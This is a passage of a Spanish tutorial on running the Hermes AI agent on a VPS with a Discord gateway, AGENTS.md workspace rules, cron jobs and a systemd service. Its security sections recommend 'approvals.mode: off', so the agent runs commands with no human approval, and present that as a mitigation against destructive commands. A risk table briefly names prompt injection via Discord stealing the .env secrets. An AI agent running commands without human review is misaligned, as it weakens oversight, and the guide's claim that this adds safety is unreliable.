> La doc oficial de Hermes lo dice explícitamente: “𝗜𝗳 𝘆𝗼𝘂 𝗽𝗿𝗲𝗳𝗲𝗿 𝘁𝗼 𝗸𝗲𝗲𝗽 𝘆𝗼𝘂𝗿 𝗯𝗼𝘁 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 (𝗣𝘂𝗯𝗹𝗶𝗰 𝗕𝗼𝘁 = 𝗢𝗙𝗙), 𝘆𝗼𝘂 𝗺𝘂𝘀𝘁 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗠𝗮𝗻𝘂𝗮𝗹 𝗨𝗥𝗟 𝗺𝗲𝘁𝗵𝗼𝗱 𝗶𝗻 𝗦𝘁𝗲𝗽 𝟱 𝗶𝗻𝘀𝘁𝗲𝗮𝗱 𝗼𝗳 𝘁𝗵𝗲 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻 𝘁𝗮𝗯. 𝗧𝗵𝗲 𝗗𝗶𝘀𝗰𝗼𝗿𝗱-𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗹𝗶𝗻𝗸 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝘀 𝗣𝘂𝗯𝗹𝗶𝗰 𝗕𝗼𝘁 𝘁𝗼 𝗯𝗲 𝗲𝗻𝗮𝗯𝗹𝗲𝗱.”

#### Permisos recomendados según la doc oficial de Hermes

Estos son los permisos 𝗺𝗶́𝗻𝗶𝗺𝗼𝘀/𝘂́𝘁𝗶𝗹𝗲𝘀 que Hermes recomienda para Discord:

- 𝗩𝗶𝗲𝘄 𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀 — ver los canales a los que tiene acceso
- 𝗦𝗲𝗻𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀 — responder
- 𝗘𝗺𝗯𝗲𝗱 𝗟𝗶𝗻𝗸𝘀 — formatear respuestas enriquecidas
- 𝗔𝘁𝘁𝗮𝗰𝗵 𝗙𝗶𝗹𝗲𝘀 — enviar imágenes, audio y archivos generados
- 𝗥𝗲𝗮𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗛𝗶𝘀𝘁𝗼𝗿𝘆 — mantener contexto de conversación
- 𝗦𝗲𝗻𝗱 𝗠𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝗶𝗻 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 — responder dentro de hilos
- 𝗔𝗱𝗱 𝗥𝗲𝗮𝗰𝘁𝗶𝗼𝗻𝘀 — poner reacciones de estado (👀, ✅, ❌)

> Como `DISCORD_AUTO_THREAD=true` y `DISCORD_REACTIONS=true` son defaults importantes en Hermes, para esta guía recomiendo directamente el set 𝗿𝗲𝗰𝗼𝗺𝗺𝗲𝗻𝗱𝗲𝗱 de la documentación oficial, no el mínimo.

> 𝗡𝗼𝘁𝗮 𝗽𝗿𝗮́𝗰𝘁𝗶𝗰𝗮 𝘀𝗼𝗯𝗿𝗲 𝗮𝗱𝗷𝘂𝗻𝘁𝗼𝘀: aunque des el permiso 𝗔𝘁𝘁𝗮𝗰𝗵 𝗙𝗶𝗹𝗲𝘀, con `terminal.backend: docker` puede haber fallos al mandar o leer archivos en Discord y Telegram porque el gateway y el sandbox no comparten exactamente la misma vista del filesystem. 𝗗𝗲 𝗺𝗼𝗺𝗲𝗻𝘁𝗼 𝗲𝘀 𝘂𝗻𝗮 𝗹𝗶𝗺𝗶𝘁𝗮𝗰𝗶𝗼𝗻 𝗰𝗼𝗻𝗼𝗰𝗶𝗱𝗮 𝗱𝗲 𝗛𝗲𝗿𝗺𝗲𝘀 en entornos sandboxed:
> https://github.com/NousResearch/hermes-agent/issues/466

#### Enteros de permisos útiles

La documentación oficial de Hermes da estos dos valores:

- 𝗠𝗶𝗻𝗶𝗺𝗮𝗹: `117760`
- 𝗥𝗲𝗰𝗼𝗺𝗺𝗲𝗻𝗱𝗲𝗱: `274878286912`

Para este tutorial usa 𝗥𝗲𝗰𝗼𝗺𝗺𝗲𝗻𝗱𝗲𝗱:

```text
permissions=274878286912
```

Abre la URL manual en tu navegador, elige tu servidor y autoriza la instalación.

📸 [images/12-discord-invite.png]

> 𝗣𝗿𝗶𝘃𝗮𝗰𝗶𝗱𝗮𝗱 𝗿𝗲𝗰𝗼𝗺𝗲𝗻𝗱𝗮𝗱𝗮 𝗽𝗮𝗿𝗮 𝗲𝘀𝘁𝗮 𝗴𝘂𝗶́𝗮: no dejes abierto 𝗨𝘀𝗲𝗿 𝗜𝗻𝘀𝘁𝗮𝗹𝗹 si no necesitas que el bot funcione como app instalable por usuarios individuales. Para este laboratorio, lo normal es:
>
> - usar 𝗚𝘂𝗶𝗹𝗱 𝗜𝗻𝘀𝘁𝗮𝗹𝗹
> - invitar el bot solo a 𝘁𝘂 𝗽𝗿𝗼𝗽𝗶𝗼 𝘀𝗲𝗿𝘃𝗶𝗱𝗼𝗿
> - mantener `𝗣𝘂𝗯𝗹𝗶𝗰 𝗕𝗼𝘁: 𝗢𝗙𝗙`
>
> Con eso reduces al mínimo la superficie de exposición y evitas que otros usuarios instalen o distribuyan tu bot fuera de tu entorno controlado.

### 10.3. Saca tu Discord User ID

Discord → 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 → 𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 → 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗠𝗼𝗱𝗲 𝗢𝗡 → click derecho sobre tu nombre → 𝗖𝗼𝗽𝘆 𝗨𝘀𝗲𝗿 𝗜𝗗.

### 10.4. Configura Hermes

```bash
hermes gateway setup
```
En el selector de plataformas:

- muévete con las flechas hasta `Discord`
- pulsa `𝗦𝗽𝗮𝗰𝗲` para marcarlo como seleccionado (`[x] Discord`)
- pulsa `𝗘𝗻𝘁𝗲𝗿` solo para confirmar la selección

> 𝗢𝗷𝗼 𝗰𝗼𝗻 𝗲𝘀𝘁𝗲 𝗱𝗲𝘁𝗮𝗹𝗹𝗲: `Enter` 𝗻𝗼 marca la plataforma, solo confirma la pantalla actual. Si pulsas `Enter` sin haber hecho antes `Space`, Hermes interpreta que no has seleccionado ninguna y muestra `No platforms selected`.

Después de marcar `Discord` correctamente, el asistente te pedirá:

- el 𝗯𝗼𝘁 𝘁𝗼𝗸𝗲𝗻 de Discord
- tu 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗨𝘀𝗲𝗿 𝗜𝗗 para `DISCORD_ALLOWED_USERS`
- opcionalmente, un 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗜𝗗 si quieres dejar preconfigurado un canal “home” para mensajes proactivos (`DISCORD_HOME_CHANNEL`)

Si ya saliste del wizard inicial sin configurarlo, no pasa nada: vuelve al prompt y ejecuta otra vez `hermes gateway setup`.

> Este comando se ejecuta 𝗱𝗲𝘀𝗱𝗲 𝘁𝘂 𝘀𝗵𝗲𝗹𝗹 𝗱𝗲𝗹 𝗩𝗣𝗦, no desde dentro de una conversación interactiva de `hermes`.

Bloque final recomendado para 𝗲𝘀𝘁𝗲 𝘁𝘂𝘁𝗼𝗿𝗶𝗮𝗹 (bot privado, un único operador, servidor propio):

```env
DISCORD_BOT_TOKEN=pega_aqui_el_token_real_del_bot
DISCORD_ALLOWED_USERS=pega_aqui_tu_discord_user_id
DISCORD_HOME_CHANNEL=pega_aqui_el_channel_id_donde_quieres_notificaciones
DISCORD_REQUIRE_MENTION=true
DISCORD_AUTO_THREAD=true
DISCORD_REACTIONS=true
```

Qué significa cada línea:

- `DISCORD_BOT_TOKEN`: el token del bot sacado de la pestaña 𝗕𝗼𝘁
- `DISCORD_ALLOWED_USERS`: tu `User ID` de Discord; Hermes solo responderá a esos usuarios
- `DISCORD_HOME_CHANNEL`: canal “home” para cron, avisos y salidas proactivas
- `DISCORD_REQUIRE_MENTION=true`: en canales de servidor, Hermes solo responde si lo mencionas con `@`
- `DISCORD_AUTO_THREAD=true`: cada mención en un canal normal abre un hilo nuevo para aislar la conversación
- `DISCORD_REACTIONS=true`: Hermes usa reacciones emoji de estado cuando corresponde

> Si todavía no tienes claro qué canal usar como `DISCORD_HOME_CHANNEL`, puedes dejar esa línea fuera al principio y fijarlo después desde Discord con `/sethome`.
> `DISCORD_HOME_CHANNEL` es opcional. Sirve para cron, avisos y salidas proactivas. Si no lo defines ahora, puedes fijarlo después con `/sethome`.

### 10.5. Lanza el gateway

Solo después de haber configurado Discord en el paso anterior:

```bash
grep '^DISCORD_' ~/.hermes/.env
hermes gateway
```

`grep` te sirve para verificar antes de arrancar que al menos quedaron guardadas estas variables:

- `DISCORD_BOT_TOKEN`
- `DISCORD_ALLOWED_USERS`

Si al final del asistente te pregunta:

```text
Install the gateway as a systemd service? (runs in background, starts on boot) [Y/n]:
```

en un 𝗩𝗣𝗦 lo correcto es:

- responder `𝗻` dentro del asistente
- terminar el setup normal
- y luego instalar el servicio del sistema manualmente con `sudo`

Esto no contradice la recomendación de Hermes de usar `systemd` en un host headless. Lo que ocurre es simplemente que 𝗲𝗹 𝘄𝗶𝘇𝗮𝗿𝗱 𝗻𝗼 𝗽𝘂𝗲𝗱𝗲 𝗰𝗿𝗲𝗮𝗿 𝘂𝗻 𝘀𝗲𝗿𝘃𝗶𝗰𝗶𝗼 𝗱𝗲 𝘀𝗶𝘀𝘁𝗲𝗺𝗮 𝗱𝗲𝘀𝗱𝗲 𝘁𝘂 𝘀𝗲𝘀𝗶𝗼́𝗻 𝗱𝗲 𝘂𝘀𝘂𝗮𝗿𝗶𝗼 𝘀𝗶𝗻 𝗽𝗿𝗶𝘃𝗶𝗹𝗲𝗴𝗶𝗼𝘀.

> Matiz importante de la doc oficial:
>
> - en portátiles o máquinas de desarrollo, suele bastar el 𝘂𝘀𝗲𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲
> - en un 𝗩𝗣𝗦, lo apropiado es el 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 / servicio de arranque
>
> Si el asistente te muestra este aviso, es normal:
>
> ```text
> System service install requires sudo, so Hermes can't create it from this user session.
> After setup, run: sudo "$(command -v hermes)" gateway install --system --run-as-user hermes
> Then start it with: sudo "$(command -v hermes)" gateway start --system
> ```
>
> Más abajo, en la sección 13, dejamos esto explicado con calma y con comandos de verificación.

A los pocos segundos el bot aparece online en tu servidor. Pruébalo:

> @hermes-agent hola, dime tu modelo actual

Debería responder y, si miras los logs (`hermes logs gateway`), verás los eventos.

📸 [images/13-discord-first-message.png]

### 10.6. Nota sobre browser automation

En esta guía hemos dejado 𝗯𝗿𝗼𝘄𝘀𝗲𝗿 𝗮𝘂𝘁𝗼𝗺𝗮𝘁𝗶𝗼𝗻 𝗰𝗼𝗺𝗼 𝘀𝗶𝗴𝘂𝗶𝗲𝗻𝘁𝗲 𝗶𝘁𝗲𝗿𝗮𝗰𝗶𝗼́𝗻, no como parte validada del setup base. Por tanto, en esta fase céntrate en comprobar:

- que el bot responde en Discord
- que usa el modelo correcto
- que el gateway arranca y se mantiene estable

Si más adelante quieres validar navegación real con navegador, `agent-browser` / CDP / proveedor cloud queda como ampliación posterior.

> Cuando confirmes que funciona, 𝗰𝘁𝗿𝗹+𝗖: lo convertiremos en servicio en el paso 13.

---

## 11. Estructura de carpetas para proyectos

Como en esta guía vamos a usar 𝘂𝗻 𝘂́𝗻𝗶𝗰𝗼 𝗛𝗲𝗿𝗺𝗲𝘀 𝗽𝗮𝗿𝗮 𝘃𝗮𝗿𝗶𝗼𝘀 𝗽𝗿𝗼𝘆𝗲𝗰𝘁𝗼𝘀, nos interesa que el agente:

- comparta memoria y aprendizajes entre sesiones
- arranque siempre en una raíz común de trabajo
- descubra desde ahí las carpetas de cada proyecto

La opción más simple es dejar un `cwd` fijo en:

- host: `/home/hermes/projects`
- contenedor Docker: `/workspace/projects`

Y poner un `AGENTS.md` global en esa raíz para explicarle a Hermes cómo debe comportarse cuando cambias de proyecto por prompt.

```bash
mkdir -p /home/hermes/projects
```

Estructura recomendada por proyecto:

```
/home/hermes/projects/<slug-proyecto>/
├── docker-compose.yml         # despliegue del prototipo
├── Dockerfile                 # imagen del servicio
├── src/                       # código
├── tests/
├── README.md                  # docs auto-generadas por Hermes
├── ARTICLE.md                 # borrador de artículo de blog/Medium
├── CHANGELOG.md
├── .env.example
└── .hermes/                   # notas del agente para futuras sesiones
    ├── decisions.md
    └── todo.md
```

Configura el cwd por defecto de Hermes:

```bash
hermes config set terminal.cwd /workspace/projects
```

Con esto consigues:

- en tu instalación actual de Hermes, el gateway y las sesiones parten del `cwd` definido en `config.yaml`
- en el 𝘀𝗮𝗻𝗱𝗯𝗼𝘅 𝗗𝗼𝗰𝗸𝗲𝗿, los comandos arrancan desde `/workspace/projects`

> No hace falta un perfil por proyecto. La memoria, las skills y las sesiones siguen viviendo en el mismo Hermes, pero el punto de partida queda normalizado en la raíz de proyectos.
>
> 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: en versiones actuales, Hermes avisa de que `MESSAGING_CWD` en `~/.hermes/.env` está 𝗱𝗲𝗽𝗿𝗲𝗰𝗮𝘁𝗲𝗱. Si lo tienes puesto de pruebas anteriores, elimínalo y deja solo `terminal.cwd` en `config.yaml`.

### 11.1. Añade un `AGENTS.md` global en `/projects`

La documentación oficial de Hermes explica que `AGENTS.md` es uno de los archivos de contexto que el agente descubre automáticamente desde el working directory y usa para cargar instrucciones del proyecto o del workspace.

Crea uno global así:

```bash
cat > /home/hermes/projects/AGENTS.md <<'EOF'
# Workspace de proyectos

Esta carpeta contiene varios proyectos independientes.

## Regla principal
- Antes de tocar código, identifica explícitamente el proyecto activo que ha pedido el usuario.
- Si el usuario dice "trabaja en Cuentee", asume que el proyecto activo es `cuentee`.

## Estructura esperada
- Cada proyecto vive en `/workspace/projects/<slug>/` dentro del contenedor.
- En el host, la ruta equivalente es `/home/hermes/projects/<slug>/`.

## Rutas obligatorias
- Dentro del sandbox Docker, trabaja siempre bajo `/workspace/projects/`.
- No uses `~/projects`, `projects/` ni `/root/projects`, porque dentro del contenedor pueden apuntar a rutas efímeras fuera del volumen compartido con el host.
- Antes de crear o clonar un proyecto, comprueba que `/workspace/projects` existe y que estás trabajando en la ruta correcta.
- Si vas a crear el proyecto `cuentee`, la ruta correcta es `/workspace/projects/cuentee`.

## Reglas operativas
- No modifiques archivos fuera del proyecto activo salvo que el usuario lo pida de forma explícita.
- Usa siempre rutas completas o haz `cd /workspace/projects/<slug>` al inicio de cada comando importante.
- Si un prompt menciona una ruta ambigua como `~/projects` o `projects/...`, normalízala primero a `/workspace/projects/...` antes de ejecutar nada.
- Antes de abrir PRs o hacer push, comprueba el repo con `git remote get-url origin`.
- Si la carpeta del proyecto no existe, indícalo y propón crearla o clonar el repo correspondiente.

## Convención de nombres
- El nombre que usa el usuario en chat puede no coincidir exactamente con el slug.
- Normaliza nombres como:
  - "Cuentee" -> `cuentee`
  - "URL Shortener" -> `url-shortener`

## GitHub
- Cada proyecto debe tener su propio repositorio remoto.
- Si hay dudas sobre qué repo corresponde al proyecto, inspecciona `git remote -v` dentro de la carpeta del proyecto.
EOF
```

Si ese comando te da `Permission denied`, normalmente significa que `/home/hermes/projects` se creó antes como `root`. Compruébalo así:

```bash
ls -ld /home/hermes /home/hermes/projects
```

Si `projects` pertenece a `root`, corrígelo una vez:

```bash
sudo chown -R hermes:hermes /home/hermes/projects
```

Y luego vuelve a ejecutar el `cat > /home/hermes/projects/AGENTS.md ...` ya 𝘀𝗶𝗻 `𝘀𝘂𝗱𝗼`.

> Ref:
> Context Files → `AGENTS.md` (https://hermes-agent.nousresearch.com/docs/user-guide/features/context-files)
> Configuration → Working Directory (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/)

### 11.2. Flujo práctico de uso

Con esta base, el flujo más simple luego será:

1. abrir una sesión nueva con `/new` si vienes de otro proyecto
2. titularla con `/title Cuentee`
3. decir algo como:

```text
Quiero trabajar en el proyecto Cuentee. Su carpeta es /workspace/projects/cuentee. Si no existe, dímelo antes de crear nada. Antes de tocar código, comprueba el repo remoto asociado.
```

Así no aíslas la memoria global de Hermes, pero sí le das una convención clara para centrarse en un único repo por sesión.

> 𝗡𝗼𝘁𝗮: `/title Cuentee` no cambia ninguna ruta ni configuración; solo pone un nombre humano a la sesión actual para poder recuperarla luego con `/resume Cuentee` o localizarla más fácilmente en `hermes sessions list`. Es útil para mantener una sesión por proyecto sin separar la memoria global de Hermes.


---

## 12. Cron diario de resumen por proyecto

Hermes tiene 𝗰𝗿𝗼𝗻 𝘀𝗰𝗵𝗲𝗱𝘂𝗹𝗲𝗿 𝗶𝗻𝘁𝗲𝗴𝗿𝗮𝗱𝗼 para ejecutar prompts en background. En este tutorial solo vamos a dejar un job simple: 𝘂𝗻𝗮 𝘃𝗲𝘇 𝗰𝗮𝗱𝗮 𝟮𝟰 𝗵𝗼𝗿𝗮𝘀, Hermes revisa los proyectos y te manda un resumen breve de los cambios detectados.

```bash
hermes cron add "0 22 * * *" \
  --prompt "Revisa /workspace/projects. Para cada proyecto con cambios recientes, redacta un resumen breve de lo hecho hoy: archivos o áreas tocadas, objetivo del cambio, estado actual y siguiente paso recomendado. Entrega el resultado en formato lista, agrupado por proyecto." \
  --deliver discord:#lab-status \
  --name daily-project-summary
```

Lista y gestiona:

```bash
hermes cron list
hermes cron disable daily-project-summary
hermes cron tick   # forzar una ejecución manual para probarlo
```

> Refs: cron / scheduler en docs/user-guide/configuration (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/) y docs/reference/cli-commands (https://hermes-agent.nousresearch.com/docs/reference/cli-commands).

---

## 13. Convertir Hermes en servicio systemd 24/7

En un VPS, la documentación oficial de Hermes recomienda usar el 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 del propio gateway en vez de depender de una sesión interactiva abierta.

Si durante `hermes gateway setup` viste este aviso:

```text
System service install requires sudo, so Hermes can't create it from this user session.
After setup, run: sudo "$(command -v hermes)" gateway install --system --run-as-user hermes
Then start it with: sudo "$(command -v hermes)" gateway start --system
```

es totalmente normal: el asistente corre como tu usuario `hermes`, pero 𝗰𝗿𝗲𝗮𝗿 𝘂𝗻 𝘀𝗲𝗿𝘃𝗶𝗰𝗶𝗼 𝗱𝗲 𝘀𝗶𝘀𝘁𝗲𝗺𝗮 𝗿𝗲𝗾𝘂𝗶𝗲𝗿𝗲 `𝘀𝘂𝗱𝗼`.

### 13.1. Instala el servicio de sistema oficial de Hermes

```bash
sudo "$(command -v hermes)" gateway install --system --run-as-user hermes
sudo "$(command -v hermes)" gateway start --system
sudo "$(command -v hermes)" gateway status --system
```

> En muchos Ubuntu, `sudo` no hereda `~/.local/bin`, así que `sudo hermes ...` puede fallar con `command not found` aunque `hermes` funcione bien en tu shell. Por eso aquí usamos `sudo "$(command -v hermes)" ...`, que resuelve primero la ruta real del binario.

Esto crea un servicio `systemd` de arranque que:

- corre en background
- arranca con el servidor
- sigue funcionando aunque cierres la sesión SSH
- ejecuta el gateway como usuario `hermes`

> La propia doc oficial recomienda 𝘂𝘀𝗲𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 para portátiles/dev boxes y 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 para VPS o hosts headless.

### 13.2. Verifica que está bien levantado

```bash
sudo "$(command -v hermes)" gateway status --system
journalctl -u hermes-gateway -f
```

Si quieres pararlo o reiniciarlo:

```bash
sudo "$(command -v hermes)" gateway stop --system
sudo "$(command -v hermes)" gateway start --system
```

### 13.2.1. Si ves `status=75` o “Gateway process is running for this profile”

Este caso nos salió de verdad durante la instalación en el VPS. La causa típica es:

- ya había un `hermes gateway` lanzado manualmente en foreground / tmux / nohup
- luego intentas arrancar además el servicio `systemd`
- Hermes detecta dos gateways para el mismo perfil y bloquea el arranque limpio

Síntomas típicos:

- `gateway status --system` muestra `status=75`
- aparece `Restart pending`
- Hermes avisa: `Gateway process is running for this profile, but the service is not active`

Flujo correcto para arreglarlo:

```bash
# 1) parar el servicio systemd si está en bucle
sudo "$(command -v hermes)" gateway stop --system

# 2) cerrar cualquier gateway manual del perfil actual
"$(command -v hermes)" gateway stop

# 3) comprobar que ya no quedan procesos sueltos
sudo "$(command -v hermes)" gateway status --system

# 4) arrancar de nuevo solo el servicio systemd
sudo "$(command -v hermes)" gateway start --system
sudo "$(command -v hermes)" gateway status --system
```

En nuestro caso real del VPS, la secuencia que terminó funcionando fue esta:

```bash
sudo "$(command -v hermes)" gateway stop --all
pgrep -af "hermes.*gateway|hermes_cli.main gateway|gateway run"
sudo systemctl reset-failed hermes-gateway
sudo "$(command -v hermes)" gateway start --system
sudo "$(command -v hermes)" gateway status --system
```

Y el estado bueno final que quieres ver es algo como:

```text
Active: active (running)
✓ System gateway service is running
✓ System service starts at boot without requiring systemd linger
```

Si aun así Hermes sigue diciendo que hay procesos manuales vivos, revisa los logs completos:

```bash
sudo journalctl -u hermes-gateway -n 100 -l
```

Y como último recurso, mata los gateways del perfil antes de volver a arrancar el servicio:

```bash
"$(command -v hermes)" gateway stop --all
sudo "$(command -v hermes)" gateway start --system
```

> No mezcles a la vez:
>
> - un `hermes gateway` lanzado manualmente
> - y el `systemd` service
>
> Elige uno. En este tutorial, en VPS, el que queremos dejar al final es 𝘀𝗼𝗹𝗼 𝗲𝗹 𝘀𝗲𝗿𝘃𝗶𝗰𝗶𝗼 `𝘀𝘆𝘀𝘁𝗲𝗺𝗱`.

### 13.3. Sobre cron y tareas en background

Según la documentación actual de Hermes, `hermes gateway` ya gestiona también el scheduler de cron del gateway, así que 𝗻𝗼 𝗻𝗲𝗰𝗲𝘀𝗶𝘁𝗮𝘀 𝘂𝗻 𝘀𝗲𝗴𝘂𝗻𝗱𝗼 𝘀𝗲𝗿𝘃𝗶𝗰𝗶𝗼 𝘀𝗲𝗽𝗮𝗿𝗮𝗱𝗼 para cron en este flujo estándar.

### 13.4. Evita duplicar servicios

No dejes a la vez:

- un `hermes gateway` corriendo en foreground en una terminal
- y el servicio `systemd`

Y evita también tener instalados a la vez el 𝘂𝘀𝗲𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 y el 𝘀𝘆𝘀𝘁𝗲𝗺 𝘀𝗲𝗿𝘃𝗶𝗰𝗲, porque Hermes avisa de que eso vuelve ambiguos los comandos `start/stop/status`.

### 13.5. Cómo acceder al dashboard desde tu portátil

La documentación oficial de Hermes indica que el dashboard y su pestaña de chat requieren los extras `web,pty`. Si hiciste una instalación manual o una instalación mínima y `hermes dashboard` no arranca bien, instala esos extras antes de seguir:

```bash
pip install 'hermes-agent[web,pty]'
```

En nuestro caso el dashboard ya quedó disponible, así que el flujo operativo que sí hemos usado es este:

Si ejecutas esto en el VPS:

```bash
hermes dashboard
```

Hermes levanta la UI web en:

```text
http://127.0.0.1:9119
```

Ese `127.0.0.1` es 𝗲𝗹 𝗹𝗼𝗰𝗮𝗹𝗵𝗼𝘀𝘁 𝗱𝗲𝗹 𝗩𝗣𝗦, no el de tu portátil. Por eso, si intentas abrir esa URL directamente desde tu navegador local, verás `ERR_CONNECTION_REFUSED`.

La forma recomendada de acceder es 𝗺𝗮𝗻𝘁𝗲𝗻𝗲𝗿 𝗲𝗹 𝗱𝗮𝘀𝗵𝗯𝗼𝗮𝗿𝗱 𝗲𝘀𝗰𝘂𝗰𝗵𝗮𝗻𝗱𝗼 𝘀𝗼𝗹𝗼 𝗲𝗻 𝗹𝗼𝗰𝗮𝗹𝗵𝗼𝘀𝘁 y exponerlo mediante un 𝘁𝘂́𝗻𝗲𝗹 𝗦𝗦𝗛.

En el VPS:

```bash
hermes dashboard --no-open
```

Deja esa terminal del VPS abierta. Después, abre 𝗼𝘁𝗿𝗮 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝗹 𝗲𝗻 𝘁𝘂 𝗺𝗮́𝗾𝘂𝗶𝗻𝗮 𝗹𝗼𝗰𝗮𝗹 y ejecuta allí:

```bash
ssh -L 9119:127.0.0.1:9119 hermes@IP_DE_TU_VPS
```

Y luego, en el navegador de tu portátil:

```text
http://127.0.0.1:9119
```

> 𝗢𝗷𝗼: este comando `ssh -L ...` se ejecuta en tu 𝗽𝗼𝗿𝘁𝗮́𝘁𝗶𝗹, no dentro del propio VPS. Si lo lanzas desde una sesión ya conectada al servidor, no estarás creando el túnel que necesitas para ver la UI en tu navegador local.

> 𝗜𝗺𝗽𝗼𝗿𝘁𝗮𝗻𝘁𝗲: evita exponer el dashboard con `--host 0.0.0.0` salvo que luego lo protejas tú con un reverse proxy y autenticación. La documentación oficial avisa de que el dashboard puede leer y editar ficheros sensibles como `~/.hermes/.env` y no trae autenticación propia.

---

## 14. Seguridad y límites

### 14.1. Lo no negociable

- ✅ SSH solo con clave, sin root, fail2ban activo.
- ✅ UFW + Cloud Firewall (doble capa).
- ✅ `terminal.backend: docker` para aislar a Hermes del sistema base y limitarlo a lo que vea dentro del contenedor y de los volúmenes montados.
- ✅ `approvals.mode: off` + `security.redact_secrets: true` + `tirith_enabled: true`.
- ✅ `DISCORD_ALLOWED_USERS` siempre poblado (sin esto, el gateway deniega por defecto).
- ✅ `chmod 600 ~/.hermes/.env`.
- ✅ Backups diarios de Hetzner activos.
- ✅ Límite de gasto en OpenRouter (Settings → Limits).

### 14.2. Riesgos conocidos de esta arquitectura

- Prompt injection desde Discord exfiltra .env
  - Mitigación: `DISCORD_ALLOWED_USERS` restringe quién habla; `redact_secrets` enmascara antes de enviar al modelo
- Costes OpenRouter desbocados
  - Mitigación: Hard limit en OpenRouter + alerta + `agent.max_turns` + `fallback_model`/`delegation` más baratos
- Hermes ejecuta comando destructivo
  - Mitigación: Sandbox Docker + `approvals.mode: off` + mounts limitados + `tirith_enabled`
- Quedas sin disco con muchos proyectos
  - Mitigación: `docker system prune -a -f --filter "until=72h"` semanal + cron de aviso al 80%
- Bot token leakeado
  - Mitigación: Rotación inmediata desde Developer Portal; `hermes config rotate DISCORD_BOT_TOKEN`
- OpenRouter caído
  - Mitigación: `fallback_model` en config + `provider_routing.sort: throughput`

---

## 15. Pasar un prototipo a producción con Sliplane

Cuando un prototipo merece salir del laboratorio, la opción más directa que veo ahora mismo es Sliplane (https://sliplane.io?utm_source=ref_1rh1d59lxrc8).

Antes de subirlo, deja el proyecto así:

- `Dockerfile` razonablemente limpio
- variables de entorno fuera del código
- `docker-compose.yml` usado solo en el laboratorio
- un endpoint `/health` o equivalente para comprobar que arranca

El flujo básico sería:

1. hacer push del repo a GitHub
2. entrar en Sliplane (https://sliplane.io?utm_source=ref_1rh1d59lxrc8)
3. crear un servicio nuevo conectando ese repo
4. dejar que detecte el `Dockerfile`
5. configurar las variables de entorno desde el panel
6. desplegar y probar la URL resultante

No es la única forma de sacar algo a producción, pero para prototipos y servicios pequeños me parece la más simple.

---

## 16. Checklist final

Antes de declarar el laboratorio "listo":

- [ ] VPS Hetzner CX32 creado, IP fija anotada.
- [ ] Usuario `hermes` con sudo, root SSH bloqueado.
- [ ] UFW + Cloud Firewall (22, 80, 443).
- [ ] Fail2ban activo.
- [ ] Docker + Compose instalados, `docker run hello-world` OK.
- [ ] Hermes Agent instalado (`hermes doctor` sin errores).
- [ ] OpenRouter API key cargada y `hermes` responde con `qwen/qwen3.6-plus`.
- [ ] `terminal.backend: docker` activo, `terminal.cwd=/workspace/projects`, `approvals.mode: off`.
- [ ] Discord bot creado, intents activados, `hermes gateway` responde.
- [ ] `hermes-gateway.service` enable + running.
- [ ] `/home/hermes/projects/` y `AGENTS.md` global creados.
- [ ] Cron `daily-project-summary` registrado y probado.
- [ ] Backups diarios de Hetzner activos.
- [ ] Límite de gasto en OpenRouter.
- [ ] Primer proyecto real creado con Hermes.
- [ ] Captura de pantallas en `images/`.
- [ ] Cada repo puede generar o mantener su propio `ARTICLE.md`.

---

## Apéndice A: comandos útiles del día a día

```bash
hermes status               # estado general
hermes logs gateway -f      # logs en vivo del gateway
hermes sessions list        # sesiones recientes
hermes memory search "..."  # busca en memoria
hermes cron list
hermes skills list
hermes update               # actualizar a última versión
hermes backup               # zip de config y datos

docker ps
docker system df
docker system prune -a -f --filter "until=72h"

systemctl status hermes-gateway
journalctl -u hermes-gateway -f
```

## Apéndice B: troubleshooting rápido

- Bot online pero no responde
  - Diagnóstico: Falta Message Content Intent
  - Solución: Activarlo en Developer Portal y reiniciar gateway
- `hermes gateway` se cierra al cabo de 1 min
  - Diagnóstico: Token Discord rotado/expirado
  - Solución: Reset Token + actualizar `.env`
- Modelos lentísimos
  - Diagnóstico: `provider_routing.sort: throughput` no aplicado
  - Solución: Reinicia gateway tras editar `config.yaml`
- Error "context length exceeded"
  - Diagnóstico: Sesión enorme
  - Solución: `/compress` o `/new` desde Discord
- Costes disparados en OpenRouter
  - Diagnóstico: Modelo principal/fallback demasiado caros o sin `delegation` configurado
  - Solución: Revisa `model.default`, `fallback_model` y `delegation`
- `docker compose up` falla con permiso denegado
  - Diagnóstico: Usuario no en grupo docker
  - Solución: `sudo usermod -aG docker hermes` y relogin
- Hermes pide aprobaciones constantes
  - Diagnóstico: `approvals.mode: manual`
  - Solución: Cámbialo a `off` si mantienes el flujo de esta guía

## Apéndice C: referencias oficiales

- 𝗗𝗼𝗰𝘀 𝗛𝗲𝗿𝗺𝗲𝘀 𝗔𝗴𝗲𝗻𝘁: https://hermes-agent.nousresearch.com/docs
- 𝗤𝘂𝗶𝗰𝗸𝘀𝘁𝗮𝗿𝘁: https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/
